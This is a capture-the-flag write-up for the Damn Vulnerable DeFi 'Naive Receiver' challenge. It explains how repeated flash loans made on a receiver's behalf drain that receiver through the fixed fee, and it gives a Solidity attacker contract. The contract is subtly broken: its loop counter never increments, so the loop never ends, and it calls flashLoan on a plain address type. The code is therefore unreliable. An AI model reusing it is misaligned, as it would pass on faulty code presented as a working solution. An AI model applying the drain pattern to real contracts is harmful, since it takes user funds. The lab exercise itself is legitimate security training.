# #2 Naive Receiver Damn Vulnerable Defi

## Goals

=> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

=> A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

=> Take all ETH out of the user’s contract. If possible, in a single transaction.

### Hints

- None

### Solution

- To drain the funds we can just call the `flashLoan()` function of the pool ten times and put in the receiver contract as a receiver, this will drain the receivers balance to zero, since it only checks if the function got called by the pool.

- To drain the contract in one Transaction we should deploy a Hack contract that deploys 10 contracts inside it's constructor in a loop that all call `flashLoan()` with the address of the receiver contract as a loan receiver, this will drain it's balance to zero in one transaction

### Attacker Contract

```solidity
contract Hack {
    uint256 attackCounter = 1;

    constructor(address _pool, address _receiver) {
        while (attackCounter < 11) {
            new Attacker(_pool, _receiver);
        }
    }
}

contract Attacker {
    address private pool;
    IERC3156FlashBorrower receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) {
        pool = _pool;
        receiver = IERC3156FlashBorrower(_receiver);
        pool.flashLoan(_receiver, ETH, 0, "");
    }
}
```
